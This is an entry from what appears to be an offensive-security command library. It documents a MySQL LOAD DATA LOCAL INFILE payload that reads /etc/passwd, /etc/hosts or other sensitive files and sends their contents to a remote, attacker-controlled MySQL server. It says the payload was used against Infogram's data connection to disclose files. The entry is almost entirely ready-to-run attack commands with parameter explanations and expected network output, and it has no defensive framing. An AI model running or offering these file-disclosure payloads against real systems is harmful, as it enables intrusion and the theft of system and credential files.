---
data: >-
  LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE asd.asd FIELDS TERMINATED BY
  "\\n";
tags:
  - lfi
  - mysql
type: command
output: null
executor: sql
platforms:
  - Linux
created_at: '2024-01-01T00:00:00Z'
updated_at: '2025-12-14T17:26:22.681Z'
id: 4932c636-823d-405e-8fbc-d199bf9183b8
verified: false
validated: true
submitted: true
---
# load-data-local-infile-lfi

## Command

```sql
LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE asd.asd FIELDS TERMINATED BY "\\n";
```

## Description

This MySQL command exploits the LOAD DATA LOCAL INFILE feature to read a local file on the server executing the query and transmit its contents to the remote MySQL server over the network. Used in Infogram's data connection to achieve LFI and file disclosure.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| INFILE '/etc/passwd' | Path to the local file to read | Yes |
| INTO TABLE asd.asd | Target database.table to insert data | Yes |
| FIELDS TERMINATED BY "\\n" | Delimiter for parsing file lines (newline) | Yes |

## Examples

### Basic Usage

```sql
LOAD DATA LOCAL INFILE '/etc/hosts' INTO TABLE asd.asd FIELDS TERMINATED BY "\\n";
```

### Advanced Usage

```sql
LOAD DATA LOCAL INFILE '/path/to/sensitive/file' INTO TABLE custom.db FIELDS TERMINATED BY ',' ENCLOSED BY '"';
```

## Expected Output

Contents of the specified file transmitted in MySQL protocol packets, visible in Wireshark as 'Request Command Unknown' with the file data payload. No direct output in the app; results in connection error.

## Related

- [[Related Procedure: Configure-Malicious-Infogram-MySQL-Connection]]
